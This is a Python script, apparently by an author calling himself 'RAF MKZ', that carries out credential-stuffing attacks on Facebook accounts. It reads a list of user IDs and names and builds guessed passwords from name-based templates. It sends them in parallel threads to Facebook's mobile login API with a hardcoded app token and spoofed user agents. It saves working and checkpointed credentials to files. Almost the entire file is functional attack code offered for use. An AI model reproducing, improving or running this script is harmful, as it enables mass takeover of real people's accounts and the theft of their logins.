#!/usr/bin/python3
#creater:
#_________[ IMPORTING MODULES ]______>>
import os,requests,json,time
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#__________[ EMPITY LOOP / LIST ]_______>>
oks = []
user_ID = []
cps = []
cracked = []
pwx = []
ualist = []
#_______[ BASIC COLORS ]_____>>
white = '\033[1;37m'
rad = '\033[1;31m'
green = '\033[1;32m'
P = '\x1b[1;97m' # ABU ABU
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # ABU ABU
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
#_________[ LOGO ]______>>>
def logo():
	os.system('clear')
	print(50*'=')
	print(f''''\n{H} ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓██████▓▒░   
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░        
  {M}TOOLS CLONING FILE BY RAF MKZ
                                         
                                         ''')
	print(f"""{P}[{H}>>{P}] Author  : RAF MKZ (RAF LY){P}\n{P}[{H}>>{P}] Contact : 085756618983{P}  """)
	print(50*'=')
#_________[ USER-AGENT LIST GENERATER ]______>>>
def arnold_1(count=100):
    """
    Generate unique User-Agent strings (2009–2016 era).
    Includes Android, iOS, and Windows/Mac desktop.
    """
    android_versions = [
        '2.1','2.2.1','2.3.6','4.0.4','4.1.2',
        '4.2.2','4.3.1','4.4.2','5.0.1','5.1.1','6.0.1'
    ]
    ios_versions = [
        'iPhone OS 4_2_1','iPhone OS 5_1_1','iPhone OS 6_1_3',
        'iPhone OS 7_1_2','iPhone OS 8_4','iPhone OS 9_3_5'
    ]
    win_versions = ['Windows NT 5.1','Windows NT 6.0','Windows NT 6.1']
    mac_versions = [
        'Macintosh; Intel Mac OS X 10_6_8','Macintosh; Intel Mac OS X 10_7_5',
        'Macintosh; Intel Mac OS X 10_8_5','Macintosh; Intel Mac OS X 10_9_5',
        'Macintosh; Intel Mac OS X 10_10_5'
    ]

    android_models = [
        'GT-I9000','GT-I9100','GT-S5830','GT-N7000',
        'HTC Desire','Nexus One','Xperia X10i','LG-P500',
        'GT-N7100','SM-J500H','SM-G355H','SM-G610F',
        'SM-G900H','SM-G7102','MotoG2','Redmi Note 3'
    ]

    iphone_models = [
        'iPhone','iPhone3,1','iPhone4,1','iPhone5,2',
        'iPhone6,1','iPhone7,2'
    ]

    user_agents = set()  # unique store

    while len(user_agents) < count:
        ua_type = random.choice(['android','ios','desktop'])

        if ua_type == 'android':
            ua = (
                f'Dalvik/1.6.0 (Linux; U; Android {random.choice(android_versions)}; '
                f'{random.choice(android_models)} Build/{random.choice(["FRF91","GRJ90","IMM76D","JZO54K","KOT49H","LRX21V","MMB29K"])}) '
                f'[FBAN/FB4A;FBAV/{random.randint(10,120)}.0.0.{random.randint(1,40)}.{random.randint(10,400)};'
                f'FBPN/com.facebook.katana;FBLC/en_US;FBBV/{random.randint(1000000,1500000)};'
                f'FBCR/{random.choice(["Airtel","Vodafone","Jio","Idea","Telenor"])};'
                f'FBMF/{random.choice(["samsung","HTC","LGE","Sony","Xiaomi","Motorola"])};'
                f'FBBD/{random.choice(["samsung","HTC","LGE","Sony","Xiaomi","Motorola"])};'
                f'FBDV/{random.choice(android_models)};FBSV/{random.choice(android_versions)};'
                f'FBCA/armeabi-v7a;FBDM{{density=1.5,width=480,height=800}};FB_FW/1;]'
            )

        elif ua_type == 'ios':
            ua = (
                f'Mozilla/5.0 ({random.choice(iphone_models)}; CPU {random.choice(ios_versions)} like Mac OS X) '
                f'AppleWebKit/534.{random.randint(30,60)} (KHTML, like Gecko) '
                f'Version/{random.choice(["5.1","6.0","7.0","8.0","9.0"])} Mobile/{random.randint(8,9)}A{random.randint(100,999)} '
                f'Safari/7534.{random.randint(10,60)} [FBAN/FBIOS;FBAV/{random.randint(10,110)}.0.0.{random.randint(1,30)}.{random.randint(10,300)};FBPN/com.facebook.Facebook;FBLC/en_US]'
            )

        else:  # desktop
            ua = random.choice([
                f'Mozilla/5.0 ({random.choice(win_versions)}; rv:{random.randint(3,48)}.0) Gecko/20100101 Firefox/{random.randint(3,48)}.0',
                f'Mozilla/5.0 ({random.choice(win_versions)}) AppleWebKit/537.{random.randint(1,36)} (KHTML, like Gecko) Chrome/{random.randint(7,49)}.0.{random.randint(500,1999)}.0 Safari/537.{random.randint(1,36)}',
                f'Mozilla/5.0 ({random.choice(mac_versions)}) AppleWebKit/534.{random.randint(1,60)} (KHTML, like Gecko) Version/{random.choice(["5.1","6.0","7.0","8.0","9.0"])} Safari/534.{random.randint(1,60)}'
            ])

        user_agents.add(ua)

    return list(user_agents)
##========ua2=================
def arnold_1():
    """
    Generates random Windows User-Agent strings (2009–2014 era).
    """
    # Chrome (2009–2014 builds → v5–39)
    chrome_ver = f"{random.randint(5, 39)}.0.{random.randint(200, 2000)}.{random.randint(0, 150)}"
    A = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1'])}; en-US) " \
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"

    # Firefox (2009–2014 → v3.5 – v34)
    ff_major = random.randint(3, 34)
    B = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.1'])}; rv:{ff_major}.0) " \
        f"Gecko/20100101 Firefox/{ff_major}.0"

    # Internet Explorer (IE8–IE11)
    ie_ver = random.choice(["8.0", "9.0", "10.0", "11.0"])
    trident_map = {"8.0": "4.0", "9.0": "5.0", "10.0": "6.0", "11.0": "7.0"}
    C = f"Mozilla/5.0 (compatible; MSIE {ie_ver}; Windows NT {random.choice(['5.1','6.1'])}; Trident/{trident_map[ie_ver]})"

    return random.choice([A, B, C])


def arnold_2():
    """
    Generates random Android User-Agent strings (2010–2014 era).
    """
    android_ver = random.choice(["2.3.6","4.0.4","4.1.2","4.2.2","4.3","4.4.2"])
    devices = [
        "GT-I9100", "GT-I9300", "GT-N7100", "Nexus 4", "Nexus 5", 
        "HTC One X", "LG-P990", "Sony Xperia Z", "Micromax A110"
    ]
    device = random.choice(devices)
    chrome_ver = f"{random.randint(18, 39)}.0.{random.randint(800, 2000)}.{random.randint(0, 150)}"
    
    A = f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) " \
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"

    return A


def arnold_3():
    """
    Generates random iOS User-Agent strings (2010–2014 era).
    """
    ios_ver = random.choice(["4_3_5","5_1_1","6_1_6","7_1_2"])
    devices = ["iPhone", "iPad", "iPod touch"]
    device = random.choice(devices)

    # Safari builds (2009–2014)
    safari_map = {
        "4_3_5": ("533.17.9","5.0"),
        "5_1_1": ("534.46","5.1"),
        "6_1_6": ("536.26","6.0"),
        "7_1_2": ("537.51.2","7.0"),
    }
    safari_ver, version_str = safari_map[ios_ver]

    A = f"Mozilla/5.0 ({device}; CPU {device} OS {ios_ver} like Mac OS X) " \
        f"AppleWebKit/{safari_ver} (KHTML, like Gecko) Version/{version_str} Mobile/10A5376e Safari/{safari_ver}"

    return A


def arnold_all():
    """
    Returns a random UA from Windows, Android, or iOS (2009–2014 pools).
    """
    return random.choice([arnold_1(), arnold_2(), arnold_3()])
#___________[ FILE CLONING OLD / NEW ]__________>>
def file_crack():
    logo()
    fileX = input(f"[{green}+{white}] Input File Path : ")
    try:
        file_data = open(fileX,"r").read()
    except FileNotFoundError:
        exit(f"\n{rad} file not found ... ")
    except PermissionError:
        exit(f"\n{rad} allow the permission ... ")
    try:
        limit = int(input(f"\n[{green}+{white}] Input Password Limit : "))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    logo()
    print(f"[{green}+{white}] example : first last - firstlast")
    print(f"[{green}+{white}] example : first123 - last1234")
    print(f"[{green}+{white}] example : khankhan - 786786 - 000786")
    print(50*'-')
    for i in range(limit):
        password = input(f"[{green}+{white}] Input Password {str(i+1)} : ")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=30) as BilalHaiderID:
        total = str(len(file_data.splitlines()))
        logo()
        print(f"[{green}*{white}] Total UID for Crack : {total}")
        print(f"[{green}*{white}] Total Password for Crack : {str(len(pwx))}")
        print(f"[{green}*{white}] File Path : {fileX}")
        print(50*'-')
        uidX = file_data.splitlines()
        for uid in uidX:
            BilalHaiderID.submit(bapif,uid,pwx,total)
    print(50*"-")
    print(f"{white}[{green}•{white}] process Has been Completed")
    print(f"{white}[{green}•{white}] Total Ids : {len(oks)} ")
#_______[ B-API CRACK - FILE ]_____>>
def bapif(uidY,pwx,total):
    global oks,cps
    global ualist
    global cracked
    uid = uidY.split("|")[0]
    name = uidY.split("|")[1]
    fist = name.split(" ")[0]
    try:
        last = name.split(" ")[1]
    except IndexError:
        last = "Khan"
    try:
        sys.stdout.write(f'\r\r[{green}Infinity{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("first",(fist.lower()))
            pw = pw.replace("last",(last.lower()))
            pw = pw.replace("fullname",(name.lower()))
            pw = pw.replace("First",fist)
            pw = pw.replace("Last",last)
            pw = pw.replace("Fullname",name)
            useragent = arnold_all()
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
            headersX = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': useragent}
            responce = requests.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                if uid not in oks:
                    print(f'\r{green}[RAF-OK] {uid} | {pw} {white}')
                    open('/sdcard/RAF-MKZ-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[RAF-CP] {uid}     | {pw} {white}')
                    open('/sdcard/RAF-MKZ-CP.txt', 'a').write(f"{uid}|{pw}\n")
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:print(e)
if __name__=="__main__":
    file_crack()
    #print("script read kro ")